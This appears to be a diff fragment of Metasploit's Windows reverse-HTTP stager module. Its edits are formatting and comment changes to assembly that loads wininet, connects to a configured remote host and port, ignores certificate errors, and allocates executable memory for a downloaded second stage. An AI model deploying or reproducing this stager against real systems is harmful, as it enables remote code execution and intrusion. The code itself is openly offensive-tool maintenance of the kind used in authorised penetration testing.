@@ -70,7 +70,7 @@ module Payload::Windows::ReverseHttp
         call ebp               ; LoadLibraryA( "wininet" )
 
       set_retry:
-        push 8                 ; retry 8 times should be enough
+        push.i8 8              ; retry 8 times should be enough
         pop edi
         xor ebx, ebx           ; push 8 zeros ([1]-[8])
         mov ecx, edi
@@ -90,7 +90,7 @@ module Payload::Windows::ReverseHttp
       internetconnect:
                                ; DWORD_PTR dwContext (NULL) [6]
                                ; dwFlags [7]
-        push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
+        push.i8 3              ; DWORD dwService (INTERNET_SERVICE_HTTP)
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
         push #{opts[:port]}    ; PORT
@@ -129,9 +129,9 @@ module Payload::Windows::ReverseHttp
             ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
             ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
           mov eax, esp
-          push.i8 4                 ; sizeof(dwFlags)
+          push.i8 4              ; sizeof(dwFlags)
           push eax               ; &dwFlags
-          push.i8 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
+          push.i8 31             ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
           push esi               ; hHttpRequest
           push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
           call ebp
@@ -154,8 +154,7 @@ module Payload::Windows::ReverseHttp
         dec edi
         jnz send_request
 
-      ; if we didn't allocate before running out of retries, fall through to
-      ; failure
+      ; if we didn't allocate before running out of retries, bail out
       ^
 
       if opts[:exitfunk]
@@ -173,7 +172,7 @@ module Payload::Windows::ReverseHttp
 
       asm << %Q^
         allocate_memory:
-          push.i8 0x40              ; PAGE_EXECUTE_READWRITE
+          push.i8 0x40           ; PAGE_EXECUTE_READWRITE
           push 0x1000            ; MEM_COMMIT
           push 0x00400000        ; Stage allocation (8Mb ought to do us)
           push ebx               ; NULL as we dont care where the allocation is
